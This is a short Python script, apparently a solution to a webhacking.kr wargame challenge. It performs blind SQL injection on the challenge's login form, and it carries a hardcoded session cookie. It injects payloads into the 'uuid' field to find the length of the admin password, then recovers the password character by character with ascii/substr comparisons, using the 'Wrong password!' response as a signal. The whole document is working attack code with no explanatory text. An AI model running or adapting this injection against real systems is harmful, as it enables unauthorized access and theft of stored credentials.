from requests import *
url='https://webhacking.kr/challenge/bonus-2/index.php'
cookies={'PHPSESSID':'sa9258v2ohco8u9kdpmm9f6bad'}
key='Wrong password!'
leng=0
count=0
for i in range(50):
    data={'uuid':f'1\'or(id=\'admin\')and((length(pw))={i})#'}
    response=post(url=url,cookies=cookies,data=data)
    t=response.text
    if response.text.find(key) != -1:
        print('admin\'s password length : ',i)
        leng=i
        break
print('admin\'s password : ',end='')
for i in range(1,leng+1):
    if count > 108:
        print('query error')
        break
    for j in range(20,128):
        data={'uuid':f'1\'or(id=\'admin\')and((ascii(substr(pw,{i},1))like({j})))#'}
        response=post(url=url,cookies=cookies,data=data)
        t=response.text
        count+=1
        if response.text.find(key) != -1:
            print(chr(j),end='')
            count=0
            break
print('\n')